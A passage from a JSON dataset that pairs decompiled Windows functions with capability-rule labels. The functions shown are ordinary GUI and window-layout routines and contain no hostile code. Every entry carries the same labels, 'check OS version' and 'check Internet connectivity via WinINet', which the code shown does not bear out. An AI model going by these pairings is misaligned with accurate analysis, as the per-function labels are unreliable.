            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004579cc(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x57) == '\\0') && (*(in_EAX + 0x30) != 0)) {\n        fcn.004543d4();\n    }\n    if (((*(in_EAX + 0x1c) & 0x10) == 0) || ((*(in_EAX + 0x51) & 4) != 0)) {\n        fcn.00455128();\n    }\n    return;\n}\n",
        "token_count": 123
    },
    "00457b50": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00457b50(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    if (((*(in_EAX + 0x50) & 0x10) != 0) && (*(in_EAX + 0x30) != 0)) {\n        cVar1 = fcn.00458874();\n        if (cVar1 != '\\0') {\n            iVar2 = sub.user32.dll_IsWindowVisible(*(in_EAX + 0x1b4));\n            if (iVar2 != 0) {\n                fcn.0045846c();\n            }\n        }\n    }\n    fcn.004546e8();\n    return;\n}\n",
        "token_count": 157
    },
    "00457c94": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t fcn.00457c94(void)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint uStack20;\n    \n    uVar1 = uStack20;\n    uStack20 = CONCAT31(uStack20._1_3_, 1);\n    if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n        if (in_EAX != 0) {\n            do {\n                iVar3 = fcn.0040484c();\n                if ((iVar3 != 0) && (*(iVar3 + 0x38) != 0)) {\n                    cVar2 = fcn.0040484c();\n                    if (cVar2 != '\\0') goto code_r0x00457d1f;\n                }\n                in_EAX = *(in_EAX + 0x30);\n            } while (in_EAX != 0);\n        }\n        iVar3 = fcn.0043bd00();\n        if (iVar3 != 0) {\n            cVar2 = fcn.0040484c();\n            if (cVar2 != '\\0') goto code_r0x00457d1f;\n        }\n    }\n    iVar3 = fcn.0044d2f0();\n    if (iVar3 == 0) {\n        uStack20 = uVar1 & 0xffffff00;\n    }\ncode_r0x00457d1f:\n    return CONCAT44(uStack20, uStack20) & 0xffffffff000000ff;\n}\n",
        "token_count": 357
    },
    "00458114": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00458114(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iStack32;\n    \n    iVar4 = *(in_EAX + 0x1b4);\n    if ((iVar4 == 0) || (iVar3 = sub.user32.dll_IsWindowVisible(),  iStack32 = iVar4,  iVar3 == 0)) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    if (bVar1) {\n        sub.user32.dll_ScrollWindow(*(in_EAX + 0x1b4), iStack32, param_2, 0, 0);\n    }\n    iVar4 = fcn.00454658();\n    if (-1 < iVar4 + -1) {\n        do {\n            iVar3 = fcn.0045461c();\n            cVar2 = fcn.004047dc();\n            if ((cVar2 == '\\0') || (*(iVar3 + 0x1b4) == 0)) {\n                *(iVar3 + 0x40) = *(iVar3 + 0x40) + iStack32;\n                *(iVar3 + 0x44) = *(iVar3 + 0x44) + param_2;\n            }\n            else if (!bVar1) {\n                iStack32 = *(iVar3 + 0x1b4);\n                sub.user32.dll_SetWindowPos();\n            }\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\n    fcn.0045419c();\n    return;\n}\n",
        "token_count": 385
    },
    "00458204": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00458204(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    if (*(in_EAX + 0x30) != 0) {\n        iVar2 = *(*(in_EAX + 0x30) + 0x1cc);\n        if (iVar2 != 0) {\n            param_2 = param_2 - *(iVar2 + 8);\n        }\n        iVar2 = fcn.004198e4();\n        if (-1 < iVar2) {\n            iVar1 = *(*(*(in_EAX + 0x30) + 0x1d0) + 8);\n            if (param_2 < 0) {\n                param_2 = 0;\n            }\n            if (iVar1 <= param_2) {\n                param_2 = iVar1 + -1;\n            }\n            if (iVar2 != param_2) {\n                fcn.0041977c();\n                fcn.00419904();\n            }\n        }\n        if (*(in_EAX + 0x1b4) != 0) {\n            if (param_2 == 0) {\n                uVar3 = 1;\n            }\n            else if (param_2 == *(*(*(in_EAX + 0x30) + 0x1d0) + 8) + -1) {\n                uVar3 = 0;\n            }\n            else if (iVar2 < param_2) {\n                fcn.00419888();\n                uVar3 = fcn.00458568();\n            }\n            else {\n                if (iVar2 <= param_2) {\n                    return;\n                }\n                fcn.00419888();\n                uVar3 = fcn.00458568();\n            }\n            sub.user32.dll_SetWindowPos(*(in_EAX + 0x1b4), uVar3, 0, 0, 0, 0, 3);\n        }\n    }\n    return;\n}\n",
        "token_count": 452
    },
    "00458544": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00458544(void)\n\n{\n    int32_t *in_EAX;\n    \n    if (in_EAX[0x6d] == 0) {\n        if (in_EAX[0xc] != 0) {\n            fcn.00458544();\n        }\n        (**(*in_EAX + 0x98))();\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "00458874": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00458874(void)\n\n{\n    uint32_t in_EAX;\n    \n    return in_EAX & 0xffffff00 | *(in_EAX + 0x1b4) != 0;\n}\n",
        "token_count": 50
    },
    "00458998": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00458998(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    char in_CL;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_5h;\n    \n    var_ch = 0;\n    puStack40 = 0x4589ba;\n    iVar2 = fcn.00404620();\n    uStack44 = 0x458a8e;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.0040484c();\n    if (0 < *(iVar2 + 8)) {\n        var_10h = fcn.004198e4();\n        iVar4 = var_10h;\n        if (var_10h == -1) {\n            if (in_CL == '\\0') {\n                var_10h = 0;\n                iVar4 = var_10h;\n            }\n            else {\n                var_10h = *(iVar2 + 8) + -1;\n                iVar4 = var_10h;\n            }\n        }\n        do {\n            if (in_CL == '\\0') {\n                if (iVar4 == 0) {\n                    iVar4 = *(iVar2 + 8);\n                }\n                iVar4 = iVar4 + -1;\n            }\n            else {\n                iVar4 = iVar4 + 1;\n                if (iVar4 == *(iVar2 + 8)) {\n                    iVar4 = 0;\n                }\n            }\n            iVar3 = fcn.00419888();\n            cVar1 = fcn.0040484c();\n            if (((cVar1 != '\\0') && ((arg_ch == '\\0' || (*(iVar3 + 0x1d8) != '\\0')))) &&\n               ((arg_8h == '\\0' || (*(iVar3 + 0x30) == in_EAX)))) {\n                var_ch = iVar3;\n            }\n        } while ((var_ch == 0) && (iVar4 != var_10h));\n    }\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x458a95;\n    uStack44 = 0x458a8d;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 565
    },
    "00458b60": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00458b60(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t *in_ECX;\n    int32_t *in_EDX;\n    \n    iVar1 = in_EAX[0x1d];\n    if (*(iVar1 + 0x14) == 0) {\n        *in_EDX = 0;\n    }\n    else {\n        *in_EDX = *(in_EAX[0x1d] + 0x14);\n    }\n    if (*(iVar1 + 0x10) == 0) {\n        *in_ECX = 0;\n    }\n    else {\n        *in_ECX = *(in_EAX[0x1d] + 0x10);\n    }\n    if (*(iVar1 + 0xc) == 0) {\n        *arg_ch = 0;\n    }\n    else {\n        *arg_ch = *(in_EAX[0x1d] + 0xc);\n    }\n    if (*(iVar1 + 8) == 0) {\n        *arg_8h = 0;\n    }\n    else {\n        *arg_8h = *(in_EAX[0x1d] + 8);\n    }\n    if ((*(in_EAX + 0x52) & 0x10) != 0) {\n        iVar1 = *(in_EAX[0x1e] + 8) + *(in_EAX[0x1e] + 0x10);\n        if (0 < *in_EDX) {\n            *in_EDX = *in_EDX + iVar1;\n        }\n        if (iVar1 <= *arg_ch) {\n            *arg_ch = *arg_ch - iVar1;\n        }\n        iVar1 = *(in_EAX[0x1e] + 0xc) + *(in_EAX[0x1e] + 0x14);\n        if (0 < *in_ECX) {\n            *in_ECX = *in_ECX + iVar1;\n        }\n        if (iVar1 <= *arg_8h) {\n            *arg_8h = *arg_8h - iVar1;\n        }\n    }\n    (**(*in_EAX + 0x38))(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 517
    },
    "00458c24": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00458c24(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *in_EDX;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    int32_t lprc;\n    int32_t var_5ah;\n    int32_t var_56h;\n    int32_t var_52h;\n    char var_4eh;\n    char var_4dh;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    var_4h = in_EDX;\n    cVar1 = fcn.00458874();\n    if ((cVar1 != '\\0') && (iVar3 = fcn.00454658(),  iVar3 != 0)) {\n        (**(*in_EAX + 0x44))();\n        (**(*in_EAX + 0x90))();\n        iVar3 = sub.user32.dll_IsRectEmpty();\n        if (iVar3 == 0) {\n            var_ch = (**(*in_EAX[0x1e] + 0x10))();\n            var_ch = var_ch - (var_56h - lprc);\n            var_10h = (**(*in_EAX[0x1e] + 0x10))();\n            var_10h = var_10h - (var_52h - var_5ah);\n            var_14h = (**(*in_EAX[0x1e] + 0x10))();\n            var_14h = var_14h - (var_56h - lprc);\n            var_18h = (**(*in_EAX[0x1e] + 0x10))();\n            var_18h = var_18h - (var_52h - var_5ah);\n            if (0 < *var_4h) {\n                *var_4h = *var_4h - var_ch;\n            }\n            if (0 < *var_8h) {\n                *var_8h = *var_8h - var_10h;\n            }\n            if (0 < *arg_ch) {\n                *arg_ch = *arg_ch - var_14h;\n            }\n            if (0 < *arg_8h) {\n                *arg_8h = *arg_8h - var_18h;\n            }\n            arg_8h_00 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff80;\n            var_20h = 0;\n            var_30h = 0;\n            var_24h = 0;\n            var_34h = 0;\n            var_28h = 0;\n            var_38h = 0;\n            var_2ch = 0;\n            var_3ch = 0;\n            iVar3 = fcn.00454658();\n            if (-1 < iVar3 + -1) {\n                var_1ch = 0;\n                do {\n                    iVar4 = fcn.0045461c();\n                    if ((*(iVar4 + 0x57) != '\\0') || (((*(iVar4 + 0x1c) & 0x10) != 0 && ((*(iVar4 + 0x51) & 4) == 0))))\n                    {\n                        arg_8h_00 = &var_4ch;\n                        fcn.00458b60(arg_8h_00, &var_44h);\n                        cVar1 = *(iVar4 + 0x5b);\n                        if (cVar1 == '\\0') {\n                            if (*0x4590a8 == (*(iVar4 + 0x61) & *0x4590a8)) {\n                                var_4dh = '\\x01';\n                                if (0 < var_40h) {\n                                    iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                                    var_40h = ((var_56h - lprc) - iVar5) - var_40h;\n                                }\n                                if (0 < var_44h) {\n                                    iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                                    var_44h = ((var_56h - lprc) + var_44h) - iVar5;\n                                }\n                            }\n                            else {\n                                var_4dh = '\\0';\n                            }\n                        }\n                        else if (cVar1 - 1U < 2) {\n                            var_4dh = '\\x01';\n                        }\n                        else if (cVar1 == '\\x05') {\n                            var_4dh = '\\x02';\n                        }\n                        else {\n                            var_4dh = '\\x03';\n                        }\n                        if (*(iVar4 + 0x5b) == '\\0') {\n                            if (*0x4590ac == (*(iVar4 + 0x61) & *0x4590ac)) {\n                                var_4eh = '\\x01';\n                                if (0 < var_48h) {\n                                    iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                                    var_48h = ((var_52h - var_5ah) - iVar5) - var_48h;\n                                }\n                                if (0 < var_4ch) {\n                                    iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                                    var_4ch = ((var_52h - var_5ah) + var_4ch) - iVar5;\n                                }\n                            }\n                            else {\n                                var_4eh = '\\0';\n                            }\n                        }\n                        else {\n                            uVar2 = *(iVar4 + 0x5b) - 3;\n                            if (uVar2 < 2) {\n                                var_4eh = '\\x01';\n                            }\n                            else if (uVar2 == 2) {\n                                var_4eh = '\\x02';\n                            }\n                            else {\n                                var_4eh = '\\x03';\n                            }\n                        }\n                        if (var_4dh - 1U < 2) {\n                            if (((0 < var_40h) && (*var_4h < var_40h)) && (*var_4h = var_40h,  var_20h < *var_4h)) {\n                                var_20h = *var_4h;\n                            }\n                            if (((0 < var_44h) && (var_44h < *arg_ch)) && (*arg_ch = var_44h,  var_24h < *arg_ch)) {\n                                var_24h = *arg_ch;\n                            }\n                        }\n                        else if (var_4dh == '\\x03') {\n                            iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                            var_30h = var_30h + iVar5;\n                            iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                            var_34h = var_34h + iVar5;\n                        }\n                        if (var_4eh - 1U < 2) {\n                            if (((0 < var_48h) && (*var_8h < var_48h)) && (*var_8h = var_48h,  var_28h < *var_8h)) {\n                                var_28h = *var_8h;\n                            }\n                            if (((0 < var_4ch) && (var_4ch < *arg_8h)) && (*arg_8h = var_4ch,  var_2ch < *arg_8h)) {\n                                var_2ch = *arg_8h;\n                            }\n                        }\n                        else if (var_4eh - 1U == 2) {\n                            iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                            var_38h = var_38h + iVar5;\n                            iVar4 = (**(**(iVar4 + 0x78) + 0x10))();\n                            var_3ch = var_3ch + iVar4;\n                        }\n                    }\n                    var_1ch = var_1ch + 1;\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n            }\n            if ((0 < var_20h) && (*var_4h < var_20h + var_30h)) {\n                *var_4h = var_20h + var_30h;\n            }\n            if ((0 < var_24h) && ((*arg_ch == 0 || (*arg_ch < var_24h + var_34h)))) {\n                *arg_ch = var_24h + var_34h;\n            }\n            if ((0 < var_28h) && (*var_8h < var_28h + var_38h)) {\n                *var_8h = var_28h + var_38h;\n            }\n            if ((0 < var_2ch) && ((*arg_8h == 0 || (*arg_8h < var_2ch + var_3ch)))) {\n                *arg_8h = var_2ch + var_3ch;\n            }\n            *in_FS_OFFSET = arg_8h_00;\n            if (0 < *var_4h) {\n                *var_4h = *var_4h + var_ch;\n            }\n            if (0 < *var_8h) {\n                *var_8h = *var_8h + var_10h;\n            }\n            if (0 < *arg_ch) {\n                *arg_ch = *arg_ch + var_14h;\n            }\n            if (0 < *arg_8h) {\n                *arg_8h = *arg_8h + var_18h;\n            }\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 2344
    },
    "00459164": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00459164(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint var_34h;\n    uint var_30h;\n    uint var_24h;\n    uint var_20h;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack72 = 0x459182;\n    cVar1 = fcn.00458874();\n    if ((cVar1 != '\\0') && (*(in_EAX + 0x5b) != '\\x05')) {\n        if ((*(in_EAX + 7) & 0x10) != 0) {\n            puStack72 = 0x4591a8;\n            iVar2 = fcn.00454658();\n            if (iVar2 < 1) {\n                return 1;\n            }\n        }\n        puStack72 = 0x4591be;\n        (**(*in_EAX + 0xc0))();\n        puStack72 = 0x4591c9;\n        (**(*in_EAX + 0x44))();\n        puStack72 = 0x4591d7;\n        (**(*in_EAX + 0x90))();\n        puStack72 = 0x4591df;\n        fcn.00454174();\n        uStack76 = 0x459292;\n        uStack80 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffb0;\n        puStack72 = &stack0xfffffffc;\n        iVar2 = fcn.00454658();\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar3 = fcn.0045461c();\n                if ((*(piVar3 + 0x57) != '\\0') || (((*(piVar3 + 7) & 0x10) != 0 && ((*(piVar3 + 0x51) & 4) == 0)))) {\n                    (**(*piVar3 + 0x88))(piVar3[0x13], piVar3[0x12]);\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        *in_FS_OFFSET = uStack80;\n        puStack72 = 0x459299;\n        *(in_EAX + 0x15) = *(in_EAX + 0x15) & 0xffef;\n        uStack76 = 0x459291;\n        uVar4 = fcn.0045417c();\n        return uVar4;\n    }\n    return 1;\n}\n",
        "token_count": 622
    },
    "0045985c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045985c(uint param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar1 = *(in_EAX + 0x30);\n    while ((iVar2 = iVar1,  *(in_EAX + 0x94) == 0 && (iVar2 != 0))) {\n        in_EAX = iVar2;\n        iVar1 = *(iVar2 + 0x30);\n    }\n    if (in_EAX != 0) {\n        fcn.004503a0(param_2 & 0x7f);\n    }\n    return;\n}\n",
        "token_count": 151
    },
    "004599d0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004599d0(void)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x4599e4;\n    cVar2 = fcn.00458874();\n    if ((cVar2 == '\\0') || ((*(in_EAX + 0x55) & 0x20) != 0)) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    if (bVar1) {\n        puStack20 = 0x459a0a;\n        fcn.00459908();\n    }\n    uStack24 = 0x459a40;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    fcn.004506d8();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x459a47;\n    if (bVar1) {\n        uStack24 = 0x459a3f;\n        fcn.00459908();\n    }\n    return;\n}\n",
        "token_count": 288
    },
    "00459ca0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00459ca0(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x459d2b;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    fcn.00459844();\n    if (*(in_EAX + 600) == '\\0') {\n        fcn.00450804();\n        fcn.004254f0();\n        fcn.0044fefc();\n        fcn.00450804();\n        fcn.0042550c();\n        fcn.0044ff30();\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x459d32;\n    uStack24 = 0x459d2a;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 232
    },
    "0045a0cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045a0cc(uint param_1, int16_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((param_2 != *(in_EAX + 0x68)) && (*(in_EAX + 0x68) = param_2,  *(in_EAX + 0x6a) != '\\0')) {\n        fcn.00444218();\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "0045a0f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045a0f0(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint var_4h;\n    \n    uVar2 = 0;\n    cVar1 = fcn.004485a4();\n    if (cVar1 != '\\0') {\n        if (*(in_EAX + 0x6a) == '\\0') {\n            fcn.0045a084(*(in_EAX + 0x74));\n        }\n        uVar2 = fcn.0045a164(arg_8h);\n        if (uVar2 != '\\0') {\n            *(in_EAX + 0x7c) = *(**0x4927b4 + 0x44);\n            fcn.00444218();\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 192
    },
    "0045a1c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045a1c8(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    cVar1 = fcn.004485a4();\n    if ((cVar1 != '\\0') && (*(in_EAX + 0x6c) != 0)) {\n        sub.comctl32.dll_ImageList_DragLeave(*(in_EAX + 0x6c));\n        *(in_EAX + 0x6c) = 0;\n    }\n    return;\n}\n",
        "token_count": 113
    },
    "0045a260": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.0045a260(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    bool bVar3;\n    \n    cVar1 = fcn.004485a4();\n    if ((cVar1 == '\\0') || (*(in_EAX + 0x6a) == '\\0')) {\n        bVar3 = false;\n    }\n    else {\n        fcn.0045a1c8();\n        iVar2 = sub.comctl32.dll_ImageList_EndDrag();\n        bVar3 = iVar2 != 0;\n        *(in_EAX + 0x6a) = 0;\n        fcn.0045a0cc();\n        fcn.00444218();\n    }\n    return bVar3;\n}\n",
        "token_count": 171
    },
    "0045a2b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.0045a2b0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.004534a4();\n    uVar1 = fcn.00425088();\n    *(in_EAX + 0x250) = uVar1;\n    fcn.0044f0b0();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 203
    },
    "0045a428": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0045a428(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x14) == 0) || (*(*(in_EAX + 0x14) + 0x10) == '\\0')) &&\n       ((in_EAX != *(*(in_EAX + 0x1c) + 100) || (*(in_EAX + 0x10) == '\\0')))) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 113
    },
    "0045a570": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0045a570(uint param_1, char param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint uStack32;\n    uint uStack28;\n    \n    iVar1 = in_EAX;\n    while (iVar3 = iVar1,  iVar3 != *(*(in_EAX + 0x1c) + 100)) {\n        iVar1 = *(iVar3 + 0x14);\n        if ((param_2 == *(iVar1 + 0x10)) && (*(iVar3 + 0x18) != 0)) {\n            uVar2 = fcn.0045a9c8();\n            return uVar2;\n        }\n    }\n    (**(**(*(in_EAX + 0x1c) + 0x14) + 0x44))();\n    (**(**(*(in_EAX + 0x1c) + 0x14) + 0x90))();\n    if (param_2 == '\\x01') {\n        return uStack28;\n    }\n    if (param_2 == '\\x02') {\n        return uStack32;\n    }\n    return 0;\n}\n",
        "token_count": 270
    },
    "0045a5f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
